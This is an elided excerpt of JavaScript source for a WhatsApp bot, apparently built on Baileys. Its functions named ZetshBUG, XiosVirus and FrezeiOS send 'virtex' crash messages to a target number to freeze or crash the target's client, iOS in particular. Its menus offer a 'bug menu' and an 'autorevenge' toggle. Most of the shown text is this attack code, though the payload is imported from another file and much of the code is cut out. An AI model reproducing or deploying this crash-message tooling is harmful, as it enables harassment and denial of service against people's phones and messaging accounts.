...
let ios = require("/home/runner/workspace/zetshu/message/virtex/ios.js")
// Group function
...
async function ZetshBUG(target, Ptcp = true) {
  const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/4te8ut.jpg" } },
          { upload: zyn.waUploadToServer }
        )),
        title: "Zeth D Sylvaa ϟ" + ios,
        subtitle: "𝐊𝐢𝐥𝐥⃟⃟" + ios,
   ...
   console.log(chalk.blue.bold("Active : Start Processing Crash!"));
    }
...
if (
    ...
    async function XiosVirus(target) {
      zyn.relayMessage(
        ...
        {
          extendedTextMessage: {
            text: ` 𝐊𝐢𝐥𝐥⃟⃟ -` + "Zeth D Sylvaa ϟ" + ios,
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐊𝐢𝐥𝐥⃟" + "Zeth D Sylvaa ϟ" + ios,
                 body : {text: "𝐊𝐢𝐥𝐥⃟" + "Zeth D Sylvaa ϟ" + ios}
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
    ...
    await floodsCarousel(target)
      }
    }

    async function FrezeiOS(target) {
      {
        await ZetshBUGG(target)
        await ZetshBUG(target)
    ...
    async function sendNiceMenu(jid, quoted, name = "> Zeth D Sylvaa ϟ") {
  // header image
  const header = {
    image: { url: "https://files.catbox.moe/4te8ut.jpg" } // ganti bebas
  } // caption utama (ringkas biar ga berat)
  const caption =
`✨ *${name}*
...
• Advanced`
  ...
  await zyn.sendMessage(jid, {
    ...header,
    caption,
    footer: "ZetshuDevv • Bug Menu",
     buttons: [
      { buttonId: ".bugmenu", buttonText: { displayText: "𝐊𝐢𝐥𝐥⃟" }, type: 1 },
      { buttonId: ".advanced", buttonText: { displayText: "𝐊𝐢𝐥𝐥⃟" }, type: 1 }
   ],
    headerType: 4
  }, { quoted })
}
 async function autore(jid, quoted, name = "> Zeth D Sylvaa ϟ") {
  // header image
  const header = {
    image: { url: "https://files.catbox.moe/4te8ut.jpg" } // ganti bebas
  } // caption utama (ringkas biar ga berat)
...
• Fungsi untuk balas dendam otomatis`

  await zyn.sendMessage(jid, {
    ...header,
    caption,
    footer: "ZetshuDevv • Auto Menu",
     buttons: [
      { buttonId: ".autorevenge on", buttonText: { displayText: "𝐊𝐢𝐥𝐥⃟" }, type: 1 },
      { buttonId: ".autorevenge off", buttonText: { displayText: "𝐊𝐢𝐥𝐥⃟" }, type: 1 }
   ],
    headerType: 4
  }, { quoted })
 }
